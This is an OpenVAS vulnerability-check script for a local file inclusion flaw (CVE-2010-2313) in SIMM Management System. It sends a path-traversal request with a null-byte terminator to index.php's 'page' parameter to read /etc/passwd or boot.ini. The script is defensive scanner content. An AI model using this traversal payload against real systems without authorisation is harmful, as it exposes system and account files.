###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_simm_management_system_lfi_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# SIMM Management System 'page' Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the
  context of the webserver process.
  Impact Level: Application/System";
tag_affected = "Anodyne Productions SIMM Management System Version 2.6.10";
tag_insight = "The flaw is caused by improper validation of user-supplied input via
  the 'page' parameter to 'index.php' when magic_quotes_gpc is disabled,
  that allows remote attackers to view files and execute local scripts
  in the context of the webserver.";
tag_solution = "No solution or patch is available as of 22nd June, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.anodyne-productions.com/index.php/sms/download";
tag_summary = "This host is running SIMM Management System and is prone to
  local file inclusion vulnerability.";

if(description)
{
  script_id(901127);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-06-22 14:43:46 +0200 (Tue, 22 Jun 2010)");
  script_cve_id("CVE-2010-2313");
  script_bugtraq_id(40543);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("SIMM Management System 'page' Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40009");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/59063");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12848/");

  script_description(desc);
  script_summary("Check if SMS is vulnerable to local file inclusion");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/sms", "/SMS", "/", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php?page=main"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if( ('Powered by SMS 2' >< res) && ('>Anodyne Productions<' >< res) )
  {
    foreach file (make_list("/etc/passwd","boot.ini"))
    {
      ## Try attack and check the response to confirm vulnerability.
      if(http_vuln_check(port:port, url:string (dir,"/index.php?page=../../",
                         "../../../../../../../../../../../../../",file,"%00"),
                         pattern:"(root:.*:0:[01]:|\[boot loader\])"))
      {
        security_hole(port:port);
        exit(0);
      }
    }
  }
}
